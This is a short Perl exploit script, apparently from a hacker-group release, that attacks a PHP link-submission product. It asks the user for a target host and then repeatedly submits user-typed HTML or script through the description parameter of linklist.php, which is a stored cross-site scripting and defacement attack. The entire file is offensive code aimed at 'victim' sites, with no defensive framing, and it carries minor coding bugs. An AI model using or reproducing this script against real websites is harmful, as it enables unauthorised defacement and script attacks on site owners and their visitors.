#!/usr/bin/perl
#
# Exploit by s3rv3r_hack3r
# Special Thanx : hessamx , f0rk ,sattar.li , stanic, mfox,blood moon and..
######################################################
#  ___ ___                __                         #
# /   |   \_____    ____ |  | __ ___________________ #
#/    ~    \__  \ _/ ___\|  |/ // __ \_  __ \___   / #
#\    Y    // __ \\  \___|    <\  ___/|  | \//    /  #
# \___|_  /(____  )\___  >__|_ \\___  >__|  /_____ \ #
#       \/      \/     \/     \/    \/            \/ #
#             Iran Hackerz Security Team             #
#               WebSite: www.hackerz.ir              #
######################################################
# Name    : linksubmit                               #
# Site    : http://www.phpselect.com/                #
######################################################
#you can use iframe,script and all html tags
#bug in linklist.php !!
#www.victim.com/linklist
use LWP::Simple;


print "-------------------------------------------\n";
print "=      Iran hacekerz security team        =\n";
print "=   By s3rv3r_hack3r  - www.hackerz.ir    =\n";
print "-------------------------------------------\n\n";


      print "Target >http://";
      chomp($targ = <STDIN>);
      print "your web site name >";
      chomp($wwwname= <STDIN>);
      print "your web site url >";
      chomp($wsurl= <STDIN>);
      print "your email >";
      chomp($mail= <STDIN>);

   $con=get("http://".$targ."/linklist.php") || die "[-]Cannot connect to Host";
while ()
{
     print "Html code\$";
     chomp($comd=<STDIN>);
     $commd=get("http://".$targ."/linklist.php?wsname=".$wwwname."&wsurl=".url."&email=".$mail."&description=".$comd)
}
